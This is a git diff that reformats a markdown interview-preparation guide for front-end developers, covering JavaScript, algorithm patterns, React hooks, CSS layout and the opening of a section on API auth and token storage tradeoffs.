@@ -12,15 +12,15 @@ Work through the phases in order. Each phase is self-contained but builds on the
 
 **Phases at a glance:**
 
-| Phase | Topic | Priority |
-|---|---|---|
-| 1 | JavaScript & TypeScript Core | Critical |
-| 2 | React & Component Patterns | Critical |
-| 3 | Responsive CSS & Layout | High |
-| 4 | REST APIs, Auth & Security | High |
-| 5 | Web Performance & Core Web Vitals | Medium |
-| 6 | Testing | Medium |
-| 7 | CI/CD & Git | Low (conceptual) |
+| Phase | Topic                             | Priority         |
+| ----- | --------------------------------- | ---------------- |
+| 1     | JavaScript & TypeScript Core      | Critical         |
+| 2     | React & Component Patterns        | Critical         |
+| 3     | Responsive CSS & Layout           | High             |
+| 4     | REST APIs, Auth & Security        | High             |
+| 5     | Web Performance & Core Web Vitals | Medium           |
+| 6     | Testing                           | Medium           |
+| 7     | CI/CD & Git                       | Low (conceptual) |
 
 ---
 
@@ -31,18 +31,19 @@ Work through the phases in order. Each phase is self-contained but builds on the
 ### 1.1 Must-know JavaScript
 
 #### Array methods
+
 ```js
 // Know these cold — they appear in almost every challenge
 const nums = [1, 2, 3, 4, 5];
 
-nums.filter(n => n % 2 === 0);      // [2, 4]
-nums.map(n => n * 2);               // [2, 4, 6, 8, 10]
+nums.filter((n) => n % 2 === 0); // [2, 4]
+nums.map((n) => n * 2); // [2, 4, 6, 8, 10]
 nums.reduce((acc, n) => acc + n, 0); // 15
-nums.find(n => n > 3);              // 4
-nums.some(n => n > 4);              // true
-nums.every(n => n > 0);            // true
-nums.flat();                        // flattens one level
-nums.flatMap(n => [n, n * 2]);      // map + flatten in one pass
+nums.find((n) => n > 3); // 4
+nums.some((n) => n > 4); // true
+nums.every((n) => n > 0); // true
+nums.flat(); // flattens one level
+nums.flatMap((n) => [n, n * 2]); // map + flatten in one pass
 ```
 
 ##### Deep dive: How `reduce` works internally
@@ -64,9 +65,9 @@ const sum = nums.reduce((acc, n) => acc + n, 0);
 
 // Example 2: Group objects by property
 const users = [
-  { name: 'Alice', role: 'admin' },
-  { name: 'Bob', role: 'user' },
-  { name: 'Charlie', role: 'admin' },
+  { name: "Alice", role: "admin" },
+  { name: "Bob", role: "user" },
+  { name: "Charlie", role: "admin" },
 ];
 
 const grouped = users.reduce((acc, user) => {
@@ -82,7 +83,7 @@ const flat = nested.reduce((acc, arr) => acc.concat(arr), []);
 // Result: [1, 2, 3, 4, 5]
 
 // Example 4: Count frequency
-const letters = ['a', 'b', 'a', 'c', 'b', 'a'];
+const letters = ["a", "b", "a", "c", "b", "a"];
 const freq = letters.reduce((acc, letter) => {
   acc[letter] = (acc[letter] || 0) + 1;
   return acc;
@@ -91,17 +92,19 @@ const freq = letters.reduce((acc, letter) => {
 ```
 
 **Common use cases in interviews:**
+
 - Summing, averaging, finding min/max
 - Transforming arrays into objects (grouping, indexing by ID)
 - Flattening nested structures
 - Building complex data structures in one pass
 
 #### Object manipulation
+
 ```js
 const obj = { a: 1, b: 2, c: 3 };
 
-Object.keys(obj);    // ['a', 'b', 'c']
-Object.values(obj);  // [1, 2, 3]
+Object.keys(obj); // ['a', 'b', 'c']
+Object.values(obj); // [1, 2, 3]
 Object.entries(obj); // [['a',1], ['b',2], ['c',3]]
 
 // Spread to merge/override
@@ -112,13 +115,14 @@ const { a, b = 10, ...rest } = obj;
 ```
 
 #### String methods to know
+
 ```js
-str.includes('foo')
-str.startsWith('bar')
-str.split(',').join('-')
-str.trim().toLowerCase()
-str.replace(/\s+/g, '-')
-str.padStart(5, '0')   // '00042'
+str.includes("foo");
+str.startsWith("bar");
+str.split(",").join("-");
+str.trim().toLowerCase();
+str.replace(/\s+/g, "-");
+str.padStart(5, "0"); // '00042'
 ```
 
 #### Closures and scope
@@ -141,7 +145,7 @@ for (let i = 0; i < 3; i++) {
 
 // Fix 2: Create a new scope with IIFE (Immediately Invoked Function Expression)
 for (var i = 0; i < 3; i++) {
-  (function(captured) {
+  (function (captured) {
     setTimeout(() => console.log(captured), 0);
   })(i);
 }
@@ -164,12 +168,12 @@ function createCounter() {
 const counter = createCounter();
 counter.increment(); // 1
 counter.increment(); // 2
-counter.getCount();  // 2
+counter.getCount(); // 2
 // counter.count is undefined — no direct access
 
 // Use case 2: Function factories
 function multiplyBy(factor) {
-  return function(num) {
+  return function (num) {
     return num * factor;
   };
 }
@@ -181,8 +185,8 @@ triple(5); // 15
 
 // Use case 3: Event handlers that remember context
 function setupButtons(items) {
-  items.forEach(item => {
-    const button = document.createElement('button');
+  items.forEach((item) => {
+    const button = document.createElement("button");
     button.textContent = item.name;
     button.onclick = () => console.log(`Clicked ${item.name}`);
     // Closure captures the specific 'item' for this iteration
@@ -192,25 +196,27 @@ function setupButtons(items) {
 ```
 
 **Interview tip:** If asked to explain closures, use this format:
+
 1. "A closure is a function that retains access to variables from its outer scope."
 2. Give the counter example (shows private state).
 3. Mention the `var` loop trap and how `let` fixes it.
 
 #### Promises and async/await
+
 ```js
 // Promise chaining
-fetch('/api/users')
-  .then(res => {
+fetch("/api/users")
+  .then((res) => {
     if (!res.ok) throw new Error(`HTTP ${res.status}`);
     return res.json();
   })
-  .then(data => console.log(data))
-  .catch(err => console.error(err));
+  .then((data) => console.log(data))
+  .catch((err) => console.error(err));
 
 // async/await equivalent (prefer this style)
 async function getUsers() {
   try {
-    const res = await fetch('/api/users');
+    const res = await fetch("/api/users");
     if (!res.ok) throw new Error(`HTTP ${res.status}`);
     const data = await res.json();
     return data;
@@ -221,49 +227,50 @@ async function getUsers() {
 
 // Parallel fetches — don't await sequentially when independent
 const [users, products] = await Promise.all([
-  fetch('/api/users').then(r => r.json()),
-  fetch('/api/products').then(r => r.json()),
+  fetch("/api/users").then((r) => r.json()),
+  fetch("/api/products").then((r) => r.json()),
 ]);
 ```
 
 #### Event loop — conceptual understanding
 
 **The JavaScript runtime model:**
+
 - **Call stack** executes synchronous code (LIFO — last in, first out).
-- **Microtask queue** (Promises, `queueMicrotask`) drains *completely* before the next task.
-- **Macrotask queue** (`setTimeout`, `setInterval`, I/O) runs *one task at a time*.
+- **Microtask queue** (Promises, `queueMicrotask`) drains _completely_ before the next task.
+- **Macrotask queue** (`setTimeout`, `setInterval`, I/O) runs _one task at a time_.
 - **Key rule:** All microtasks run before the next macrotask.
 
 ```js
-console.log('1');
-setTimeout(() => console.log('2'), 0);
-Promise.resolve().then(() => console.log('3'));
-console.log('4');
+console.log("1");
+setTimeout(() => console.log("2"), 0);
+Promise.resolve().then(() => console.log("3"));
+console.log("4");
 // Output: 1, 4, 3, 2
 ```
 
 ##### Step-by-step execution trace
 
 ```js
-console.log('A');                              // 1
-setTimeout(() => console.log('B'), 0);         // 2
-Promise.resolve().then(() => console.log('C')); // 3
-Promise.resolve().then(() => console.log('D')); // 4
-console.log('E');                              // 5
+console.log("A"); // 1
+setTimeout(() => console.log("B"), 0); // 2
+Promise.resolve().then(() => console.log("C")); // 3
+Promise.resolve().then(() => console.log("D")); // 4
+console.log("E"); // 5
 
 // Execution order:
-// 
+//
 // [Call Stack]
 // 1. console.log('A')  → logs 'A'
 // 2. setTimeout(...)   → schedules 'B' in macrotask queue
 // 3. Promise.then(...) → schedules 'C' in microtask queue
 // 4. Promise.then(...) → schedules 'D' in microtask queue
 // 5. console.log('E')  → logs 'E'
-// 
+//
 // [Call stack now empty — check microtask queue]
 // 6. console.log('C')  → logs 'C'
 // 7. console.log('D')  → logs 'D'
-// 
+//
 // [Microtask queue empty — check macrotask queue]
 // 8. console.log('B')  → logs 'B'
 //
@@ -273,19 +280,19 @@ console.log('E');                              // 5
 ##### Common interview question: Nested promises vs setTimeout
 
 ```js
-console.log('Start');
+console.log("Start");
 
 setTimeout(() => {
-  console.log('Timeout 1');
-  Promise.resolve().then(() => console.log('Promise in Timeout 1'));
+  console.log("Timeout 1");
+  Promise.resolve().then(() => console.log("Promise in Timeout 1"));
 }, 0);
 
 Promise.resolve().then(() => {
-  console.log('Promise 1');
-  setTimeout(() => console.log('Timeout in Promise 1'), 0);
+  console.log("Promise 1");
+  setTimeout(() => console.log("Timeout in Promise 1"), 0);
 });
 
-console.log('End');
+console.log("End");
 
 // Output:
 // Start
@@ -297,6 +304,7 @@ console.log('End');
 ```
 
 **Real-world implication:**
+
 - Use `Promise.resolve().then(...)` to defer work but run before timers.
 - Use `setTimeout(..., 0)` to defer work until after the current task + all microtasks.
 
@@ -312,13 +320,15 @@ These patterns appear repeatedly in coding interviews. Master these and you can 
 // Problem: Two Sum II (LeetCode #167) — array is sorted
 // Find two numbers that add up to target
 function twoSum(nums, target) {
-  let left = 0, right = nums.length - 1;
+  let left = 0,
+    right = nums.length - 1;
 
   while (left < right) {
     const sum = nums[left] + nums[right];
     if (sum === target) return [left + 1, right + 1]; // 1-indexed
-    if (sum < target) left++;   // need a larger sum
-    else right--;               // need a smaller sum
+    if (sum < target)
+      left++; // need a larger sum
+    else right--; // need a smaller sum
   }
   return [];
 }
@@ -362,7 +372,8 @@ function findMaxAverage(nums, k) {
 // Problem: Longest Substring Without Repeating Characters (LeetCode #3)
 function lengthOfLongestSubstring(s) {
   const seen = new Map(); // char → last seen index
-  let left = 0, maxLen = 0;
+  let left = 0,
+    maxLen = 0;
 
   for (let right = 0; right < s.length; right++) {
     if (seen.has(s[right]) && seen.get(s[right]) >= left) {
@@ -396,7 +407,7 @@ function firstUniqChar(s) {
 function groupAnagrams(strs) {
   const groups = {};
   for (const str of strs) {
-    const key = str.split('').sort().join(''); // anagrams have same sorted key
+    const key = str.split("").sort().join(""); // anagrams have same sorted key
     if (!groups[key]) groups[key] = [];
     groups[key].push(str);
   }
@@ -413,7 +424,7 @@ function groupAnagrams(strs) {
 // Problem: Valid Parentheses (LeetCode #20)
 function isValid(s) {
   const stack = [];
-  const pairs = { ')': '(', '}': '{', ']': '[' };
+  const pairs = { ")": "(", "}": "{", "]": "[" };
 
   for (const ch of s) {
     if (ch in pairs) {
@@ -451,11 +462,12 @@ function dailyTemperatures(temps) {
 ```js
 // Problem: Linked List Cycle (LeetCode #141)
 function hasCycle(head) {
-  let slow = head, fast = head;
+  let slow = head,
+    fast = head;
 
   while (fast && fast.next) {
-    slow = slow.next;           // moves 1 step
-    fast = fast.next.next;      // moves 2 steps
+    slow = slow.next; // moves 1 step
+    fast = fast.next.next; // moves 2 steps
     if (slow === fast) return true; // they met — cycle exists
   }
   return false;
@@ -464,7 +476,8 @@ function hasCycle(head) {
 
 // Problem: Middle of Linked List (LeetCode #876)
 function middleNode(head) {
-  let slow = head, fast = head;
+  let slow = head,
+    fast = head;
   while (fast && fast.next) {
     slow = slow.next;
     fast = fast.next.next;
@@ -480,7 +493,8 @@ function middleNode(head) {
 ```js
 // Problem: Binary Search (LeetCode #704)
 function search(nums, target) {
-  let left = 0, right = nums.length - 1;
+  let left = 0,
+    right = nums.length - 1;
 
   while (left <= right) {
     const mid = Math.floor((left + right) / 2);
@@ -494,10 +508,12 @@ function search(nums, target) {
 
 // Problem: First Bad Version (LeetCode #278)
 function firstBadVersion(n) {
-  let left = 1, right = n;
+  let left = 1,
+    right = n;
   while (left < right) {
     const mid = Math.floor((left + right) / 2);
-    if (isBadVersion(mid)) right = mid; // answer is mid or earlier
+    if (isBadVersion(mid))
+      right = mid; // answer is mid or earlier
     else left = mid + 1;
   }
   return left;
@@ -519,11 +535,11 @@ function generateParenthesis(n) {
       result.push(current);
       return;
     }
-    if (open < n) backtrack(current + '(', open + 1, close);
-    if (close < open) backtrack(current + ')', open, close + 1);
+    if (open < n) backtrack(current + "(", open + 1, close);
+    if (close < open) backtrack(current + ")", open, close + 1);
   }
 
-  backtrack('', 0, 0);
+  backtrack("", 0, 0);
   return result;
 }
 // Time: O(4^n / √n) — Catalan number, Space: O(n) for recursion stack
@@ -555,7 +571,8 @@ function subsets(nums) {
 // You can climb 1 or 2 steps at a time. How many ways to reach step n?
 function climbStairs(n) {
   if (n <= 2) return n;
-  let prev2 = 1, prev1 = 2;
+  let prev2 = 1,
+    prev1 = 2;
   for (let i = 3; i <= n; i++) {
     const current = prev1 + prev2;
     prev2 = prev1;
@@ -568,7 +585,8 @@ function climbStairs(n) {
 // Problem: House Robber (LeetCode #198)
 // Can't rob adjacent houses. Maximize amount stolen.
 function rob(nums) {
-  let prev2 = 0, prev1 = 0;
+  let prev2 = 0,
+    prev1 = 0;
   for (const num of nums) {
     const current = Math.max(prev1, prev2 + num); // skip or rob
     prev2 = prev1;
@@ -581,30 +599,31 @@ function rob(nums) {
 
 **Pattern recognition cheat sheet:**
 
-| If problem mentions... | Try this pattern |
-|---|---|
-| Sorted array + find pair/triplet | Two Pointers |
-| Subarray/substring of length k | Sliding Window |
-| Count frequencies, find duplicates | Hash Map |
-| Balanced brackets, parsing, undo | Stack |
-| Linked list cycle or middle | Fast & Slow Pointers |
-| Sorted + search | Binary Search |
-| Generate all combinations | Recursion + Backtracking |
-| "What's the maximum/minimum ways to..." | Dynamic Programming |
+| If problem mentions...                  | Try this pattern         |
+| --------------------------------------- | ------------------------ |
+| Sorted array + find pair/triplet        | Two Pointers             |
+| Subarray/substring of length k          | Sliding Window           |
+| Count frequencies, find duplicates      | Hash Map                 |
+| Balanced brackets, parsing, undo        | Stack                    |
+| Linked list cycle or middle             | Fast & Slow Pointers     |
+| Sorted + search                         | Binary Search            |
+| Generate all combinations               | Recursion + Backtracking |
+| "What's the maximum/minimum ways to..." | Dynamic Programming      |
 
 ### 1.4 References
+
 - [javascript.info](https://javascript.info) — read: Data types, Functions, Promises, Async/await, Classes
 - [TypeScript Handbook](https://www.typescriptlang.org/docs/handbook/intro.html) — read: Everyday Types, Generics, Utility Types
 
 ### 1.5 Practice platforms
 
-| Platform | Best for | Difficulty | Free tier |
-|---|---|---|---|
-| **LeetCode** | Algorithmic problems, patterns | Easy → Hard | Yes (most problems) |
-| **HackerRank** | Interview prep tracks, certificates | Easy → Medium | Yes |
-| **Coderbyte** | AEON360 uses this — practice here first | Easy → Hard | Limited free challenges |
-| **Frontend Mentor** | Real UI challenges (HTML/CSS/JS/React) | Junior → Advanced | Yes |
-| **StackBlitz / CodeSandbox** | Quick React/TS prototyping | N/A | Yes |
+| Platform                     | Best for                                | Difficulty        | Free tier               |
+| ---------------------------- | --------------------------------------- | ----------------- | ----------------------- |
+| **LeetCode**                 | Algorithmic problems, patterns          | Easy → Hard       | Yes (most problems)     |
+| **HackerRank**               | Interview prep tracks, certificates     | Easy → Medium     | Yes                     |
+| **Coderbyte**                | AEON360 uses this — practice here first | Easy → Hard       | Limited free challenges |
+| **Frontend Mentor**          | Real UI challenges (HTML/CSS/JS/React)  | Junior → Advanced | Yes                     |
+| **StackBlitz / CodeSandbox** | Quick React/TS prototyping              | N/A               | Yes                     |
 
 **Recommendation:** Start with 10–15 LeetCode Easy problems covering the 8 patterns above, then move to Medium problems. If the interview platform is confirmed as Coderbyte, spend your last 3 days there to get familiar with the editor and submission flow.
 
@@ -617,17 +636,21 @@ function rob(nums) {
 ### 2.1 Hooks reference
 
 #### useState
+
 ```jsx
 const [count, setCount] = useState(0);
 
 // Functional update — use when new state depends on old state
-setCount(prev => prev + 1);
+setCount((prev) => prev + 1);
 
 // Lazy initial state — runs once, not on every render
-const [data, setData] = useState(() => JSON.parse(localStorage.getItem('data') ?? '[]'));
+const [data, setData] = useState(() =>
+  JSON.parse(localStorage.getItem("data") ?? "[]"),
+);
 ```
 
 #### useEffect
+
 ```jsx
 // Runs after every render — rarely what you want
 useEffect(() => { ... });
@@ -652,6 +675,7 @@ useEffect(() => {
 ```
 
 #### useRef
+
 ```jsx
 // Two uses: DOM reference and mutable value that doesn't trigger re-render
 const inputRef = useRef<HTMLInputElement>(null);
@@ -665,6 +689,7 @@ intervalId.current = setInterval(() => ..., 1000);
 ```
 
 #### useCallback and useMemo
+
 ```jsx
 // useCallback — memoize a function reference (use when passing to child components or deps arrays)
 const handleSubmit = useCallback((e: React.FormEvent) => {
@@ -682,6 +707,7 @@ const sortedUsers = useMemo(
 > **Common mistake:** Overusing `useCallback`/`useMemo`. Only add them when you can measure a performance problem, or when a function is a dependency in another hook.
 
 #### useReducer
+
 ```jsx
 type Action =
   | { type: 'increment' }
@@ -703,24 +729,32 @@ dispatch({ type: 'reset', payload: 10 });
 ```
 
 #### useContext
+
 ```tsx
 interface ThemeContextType {
-  theme: 'light' | 'dark';
+  theme: "light" | "dark";
   toggle: () => void;
 }
 
 const ThemeContext = createContext<ThemeContextType | null>(null);
 
 function ThemeProvider({ children }: { children: React.ReactNode }) {
-  const [theme, setTheme] = useState<'light' | 'dark'>('light');
-  const toggle = useCallback(() => setTheme(t => t === 'light' ? 'dark' : 'light'), []);
-  return <ThemeContext.Provider value={{ theme, toggle }}>{children}</ThemeContext.Provider>;
+  const [theme, setTheme] = useState<"light" | "dark">("light");
+  const toggle = useCallback(
+    () => setTheme((t) => (t === "light" ? "dark" : "light")),
+    [],
+  );
+  return (
+    <ThemeContext.Provider value={{ theme, toggle }}>
+      {children}
+    </ThemeContext.Provider>
+  );
 }
 
 // Custom hook to consume context safely
 function useTheme() {
   const ctx = useContext(ThemeContext);
-  if (!ctx) throw new Error('useTheme must be used within ThemeProvider');
+  if (!ctx) throw new Error("useTheme must be used within ThemeProvider");
   return ctx;
 }
 ```
@@ -739,13 +773,16 @@ function useFetch<T>(url: string) {
     setLoading(true);
 
     fetch(url, { signal: controller.signal })
-      .then(res => {
+      .then((res) => {
         if (!res.ok) throw new Error(`HTTP ${res.status}`);
         return res.json() as Promise<T>;
       })
-      .then(data => { setData(data); setLoading(false); })
-      .catch(err => {
-        if (err.name !== 'AbortError') {
+      .then((data) => {
+        setData(data);
+        setLoading(false);
+      })
+      .catch((err) => {
+        if (err.name !== "AbortError") {
           setError(err.message);
           setLoading(false);
         }
@@ -759,34 +796,46 @@ function useFetch<T>(url: string) {
 
 // Usage
 function UserList() {
-  const { data, loading, error } = useFetch<User[]>('/api/users');
+  const { data, loading, error } = useFetch<User[]>("/api/users");
 
   if (loading) return <p>Loading...</p>;
   if (error) return <p>Error: {error}</p>;
-  return <ul>{data?.map(u => <li key={u.id}>{u.name}</li>)}</ul>;
+  return (
+    <ul>
+      {data?.map((u) => (
+        <li key={u.id}>{u.name}</li>
+      ))}
+    </ul>
+  );
 }
 ```
 
 ### 2.3 Component patterns
 
 #### Controlled form
+
 ```tsx
 function LoginForm() {
-  const [email, setEmail] = useState('');
-  const [password, setPassword] = useState('');
-  const [errors, setErrors] = useState<{ email?: string; password?: string }>({});
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  const [errors, setErrors] = useState<{ email?: string; password?: string }>(
+    {},
+  );
 
   function validate() {
     const errs: typeof errors = {};
-    if (!email.includes('@')) errs.email = 'Enter a valid email';
-    if (password.length < 8) errs.password = 'Minimum 8 characters';
+    if (!email.includes("@")) errs.email = "Enter a valid email";
+    if (password.length < 8) errs.password = "Minimum 8 characters";
     return errs;
   }
 
   function handleSubmit(e: React.FormEvent) {
     e.preventDefault();
     const errs = validate();
-    if (Object.keys(errs).length) { setErrors(errs); return; }
+    if (Object.keys(errs).length) {
+      setErrors(errs);
+      return;
+    }
     // submit...
   }
 
@@ -797,7 +846,7 @@ function LoginForm() {
         id="email"
         type="email"
         value={email}
-        onChange={e => setEmail(e.target.value)}
+        onChange={(e) => setEmail(e.target.value)}
       />
       {errors.email && <span role="alert">{errors.email}</span>}
 
@@ -806,7 +855,7 @@ function LoginForm() {
         id="password"
         type="password"
         value={password}
-        onChange={e => setPassword(e.target.value)}
+        onChange={(e) => setPassword(e.target.value)}
       />
       {errors.password && <span role="alert">{errors.password}</span>}
 
@@ -817,6 +866,7 @@ function LoginForm() {
 ```
 
 #### Error boundary
+
 ```tsx
 class ErrorBoundary extends React.Component<
   { children: React.ReactNode; fallback: React.ReactNode },
@@ -829,7 +879,7 @@ class ErrorBoundary extends React.Component<
   }
 
   componentDidCatch(error: Error, info: React.ErrorInfo) {
-    console.error('Boundary caught:', error, info);
+    console.error("Boundary caught:", error, info);
   }
 
   render() {
@@ -849,25 +899,29 @@ function TodoList() {
 
   async function toggleTodo(id: number) {
     // 1. Optimistic update — instant feedback
-    setTodos(prev => prev.map(todo =>
-      todo.id === id ? { ...todo, completed: !todo.completed } : todo
-    ));
+    setTodos((prev) =>
+      prev.map((todo) =>
+        todo.id === id ? { ...todo, completed: !todo.completed } : todo,
+      ),
+    );
 
     // 2. Sync with server
     try {
-      await fetch(`/api/todos/${id}/toggle`, { method: 'PATCH' });
+      await fetch(`/api/todos/${id}/toggle`, { method: "PATCH" });
     } catch (err) {
       // 3. Rollback on failure
-      setTodos(prev => prev.map(todo =>
-        todo.id === id ? { ...todo, completed: !todo.completed } : todo
-      ));
-      alert('Failed to update todo');
+      setTodos((prev) =>
+        prev.map((todo) =>
+          todo.id === id ? { ...todo, completed: !todo.completed } : todo,
+        ),
+      );
+      alert("Failed to update todo");
     }
   }
 
   return (
     <ul>
-      {todos.map(todo => (
+      {todos.map((todo) => (
         <li key={todo.id}>
           <input
             type="checkbox"
@@ -897,7 +951,11 @@ interface SelectContextType {
 
 const SelectContext = createContext<SelectContextType | null>(null);
 
-function Select({ value, onChange, children }: {
+function Select({
+  value,
+  onChange,
+  children,
+}: {
   value: string;
   onChange: (value: string) => void;
   children: React.ReactNode;
@@ -909,13 +967,19 @@ function Select({ value, onChange, children }: {
   );
 }
 
-function Option({ value, children }: { value: string; children: React.ReactNode }) {
+function Option({
+  value,
+  children,
+}: {
+  value: string;
+  children: React.ReactNode;
+}) {
   const ctx = useContext(SelectContext);
-  if (!ctx) throw new Error('Option must be used inside Select');
+  if (!ctx) throw new Error("Option must be used inside Select");
 
   return (
     <button
-      className={ctx.value === value ? 'active' : ''}
+      className={ctx.value === value ? "active" : ""}
       onClick={() => ctx.onChange(value)}
     >
       {children}
@@ -927,7 +991,7 @@ Select.Option = Option;
 
 // Usage — clean API, no prop drilling
 function App() {
-  const [color, setColor] = useState('red');
+  const [color, setColor] = useState("red");
   return (
     <Select value={color} onChange={setColor}>
       <Select.Option value="red">Red</Select.Option>
@@ -946,13 +1010,18 @@ function App() {
 
 ```tsx
 // Reusable mouse tracker
-function MouseTracker({ render }: { render: (pos: { x: number; y: number }) => React.ReactNode }) {
+function MouseTracker({
+  render,
+}: {
+  render: (pos: { x: number; y: number }) => React.ReactNode;
+}) {
   const [pos, setPos] = useState({ x: 0, y: 0 });
 
   useEffect(() => {
-    const handleMove = (e: MouseEvent) => setPos({ x: e.clientX, y: e.clientY });
-    window.addEventListener('mousemove', handleMove);
-    return () => window.removeEventListener('mousemove', handleMove);
+    const handleMove = (e: MouseEvent) =>
+      setPos({ x: e.clientX, y: e.clientY });
+    window.addEventListener("mousemove", handleMove);
+    return () => window.removeEventListener("mousemove", handleMove);
   }, []);
 
   return <>{render(pos)}</>;
@@ -963,7 +1032,9 @@ function App() {
   return (
     <MouseTracker
       render={({ x, y }) => (
-        <div style={{ position: 'fixed', left: x, top: y, pointerEvents: 'none' }}>
+        <div
+          style={{ position: "fixed", left: x, top: y, pointerEvents: "none" }}
+        >
           🎯 ({x}, {y})
         </div>
       )}
@@ -984,8 +1055,11 @@ function UserProfile({ userId }: { userId: number }) {
 
   useEffect(() => {
     fetch(`/api/users/${userId}`)
-      .then(r => r.json())
-      .then(data => { setUser(data); setLoading(false); });
+      .then((r) => r.json())
+      .then((data) => {
+        setUser(data);
+        setLoading(false);
+      });
   }, [userId]);
 
   if (loading) return <p>Loading...</p>;
@@ -998,9 +1072,9 @@ function Dashboard() {
 
   useEffect(() => {
     Promise.all([
-      fetch('/api/users').then(r => r.json()),
-      fetch('/api/products').then(r => r.json()),
-      fetch('/api/stats').then(r => r.json()),
+      fetch("/api/users").then((r) => r.json()),
+      fetch("/api/products").then((r) => r.json()),
+      fetch("/api/stats").then((r) => r.json()),
     ]).then(([users, products, stats]) => {
       setData({ users, products, stats });
     });
@@ -1016,14 +1090,14 @@ function PostWithComments({ postId }: { postId: number }) {
 
   useEffect(() => {
     fetch(`/api/posts/${postId}`)
-      .then(r => r.json())
+      .then((r) => r.json())
       .then(setPost);
   }, [postId]);
 
   useEffect(() => {
     if (!post) return; // wait for post to load first
     fetch(`/api/posts/${postId}/comments`)
-      .then(r => r.json())
+      .then((r) => r.json())
       .then(setComments);
   }, [postId, post]);
 
@@ -1032,15 +1106,18 @@ function PostWithComments({ postId }: { postId: number }) {
 
 // Strategy 4: Debounced search (avoid API spam)
 function SearchUsers() {
-  const [query, setQuery] = useState('');
+  const [query, setQuery] = useState("");
   const [results, setResults] = useState([]);
 
   useEffect(() => {
-    if (!query) { setResults([]); return; }
+    if (!query) {
+      setResults([]);
+      return;
+    }
 
     const timer = setTimeout(() => {
       fetch(`/api/users/search?q=${encodeURIComponent(query)}`)
-        .then(r => r.json())
+        .then((r) => r.json())
         .then(setResults);
     }, 300); // wait 300ms after user stops typing
 
@@ -1049,8 +1126,12 @@ function SearchUsers() {
 
   return (
     <div>
-      <input value={query} onChange={e => setQuery(e.target.value)} />
-      <ul>{results.map(u => <li key={u.id}>{u.name}</li>)}</ul>
+      <input value={query} onChange={(e) => setQuery(e.target.value)} />
+      <ul>
+        {results.map((u) => (
+          <li key={u.id}>{u.name}</li>
+        ))}
+      </ul>
     </div>
   );
 }
@@ -1064,6 +1145,7 @@ function SearchUsers() {
 - An infinite scroll or paginated list
 
 ### 2.5 References
+
 - [react.dev](https://react.dev) — "Describing the UI" and "Managing State" sections
 - [ui.dev React hooks](https://ui.dev/react-hooks) — visual hook lifecycle explanations
 
@@ -1077,26 +1159,30 @@ function SearchUsers() {
 /* Container */
 display: flex;
 flex-direction: row | column;
-justify-content: flex-start | center | flex-end | space-between | space-around | space-evenly;
+justify-content: flex-start | center | flex-end | space-between | space-around |
+  space-evenly;
 align-items: stretch | flex-start | center | flex-end | baseline;
 flex-wrap: nowrap | wrap;
 gap: 1rem;
 
 /* Item */
-flex: 1;          /* grow and shrink equally */
-flex: 0 0 200px;  /* fixed width, no grow/shrink */
+flex: 1; /* grow and shrink equally */
+flex: 0 0 200px; /* fixed width, no grow/shrink */
 align-self: flex-start; /* override align-items for one item */
-order: 2;         /* reorder visually without DOM change */
+order: 2; /* reorder visually without DOM change */
 ```
 
 #### Common pattern: sticky footer
+
 ```css
 body {
   min-height: 100vh;
   display: flex;
   flex-direction: column;
 }
-main { flex: 1; }
+main {
+  flex: 1;
+}
 ```
 
 ### 3.2 CSS Grid cheat sheet
@@ -1104,9 +1190,12 @@ main { flex: 1; }
 ```css
 /* Container */
 display: grid;
-grid-template-columns: repeat(3, 1fr);      /* 3 equal columns */
-grid-template-columns: 2fr 1fr;             /* 2:1 ratio */
-grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); /* responsive without media queries */
+grid-template-columns: repeat(3, 1fr); /* 3 equal columns */
+grid-template-columns: 2fr 1fr; /* 2:1 ratio */
+grid-template-columns: repeat(
+  auto-fit,
+  minmax(280px, 1fr)
+); /* responsive without media queries */
 gap: 1.5rem;
 grid-template-areas:
   "header header"
@@ -1114,32 +1203,43 @@ grid-template-areas:
   "footer footer";
 
 /* Item */
-grid-column: 1 / 3;       /* span 2 columns */
-grid-row: 1 / span 2;     /* span 2 rows */
-grid-area: header;         /* named area placement */
+grid-column: 1 / 3; /* span 2 columns */
+grid-row: 1 / span 2; /* span 2 rows */
+grid-area: header; /* named area placement */
 ```
 
 ### 3.3 Responsive breakpoints (mobile-first)
 
 ```css
 /* Base styles target mobile */
-.container { padding: 1rem; }
+.container {
+  padding: 1rem;
+}
 
 /* Tablet */
 @media (min-width: 768px) {
-  .container { padding: 2rem; }
+  .container {
+    padding: 2rem;
+  }
 }
 
 /* Desktop */
 @media (min-width: 1024px) {
-  .container { padding: 3rem; max-width: 1200px; margin: 0 auto; }
+  .container {
+    padding: 3rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
 }
 ```
 
 #### Tailwind equivalents
+
 ```html
 <!-- Mobile first, responsive prefix for larger screens -->
-<div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 p-4 md:p-8">
+<div
+  class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 p-4 md:p-8"
+></div>
 ```
 
 ### 3.4 Fluid sizing without media queries
@@ -1151,6 +1251,7 @@ padding: clamp(1rem, 5vw, 3rem);
 ```
 
 ### 3.5 References
+
 - [CSS Tricks Flexbox Guide](https://css-tricks.com/snippets/css/a-guide-to-flexbox/)
 - [CSS Tricks Grid Guide](https://css-tricks.com/snippets/css/complete-guide-grid/)
 - [Tailwind CSS Docs](https://tailwindcss.com/docs/utility-first)
@@ -1166,8 +1267,8 @@ padding: clamp(1rem, 5vw, 3rem);
 async function apiFetch<T>(url: string, options?: RequestInit): Promise<T> {
   const res = await fetch(url, {
     headers: {
-      'Content-Type': 'application/json',
-      'Authorization': `Bearer ${getToken()}`,
+      "Content-Type": "application/json",
+      Authorization: `Bearer ${getToken()}`,
     },
     ...options,
   });
@@ -1181,9 +1282,9 @@ async function apiFetch<T>(url: string, options?: RequestInit): Promise<T> {
 }
 
 // POST with body
-await apiFetch<User>('/api/users', {
-  method: 'POST',
-  body: JSON.stringify({ name: 'Alice', email: 'alice@example.com' }),
+await apiFetch<User>("/api/users", {
+  method: "POST",
+  body: JSON.stringify({ name: "Alice", email: "alice@example.com" }),
 });
 ```
 
@@ -1197,17 +1298,17 @@ await apiFetch<User>('/api/users', {
 
 #### Storage tradeoffs
 
-| Location | XSS Risk | CSRF Risk | Notes |
-|---|---|---|---|
-| `localStorage` | High | None | JS can read it — avoid for sensitive tokens |
-| `sessionStorage` | High | None | Cleared on tab close, still readable by JS |
-| `httpOnly` cookie | None | Moderate | Cannot be read by JS — safest option |
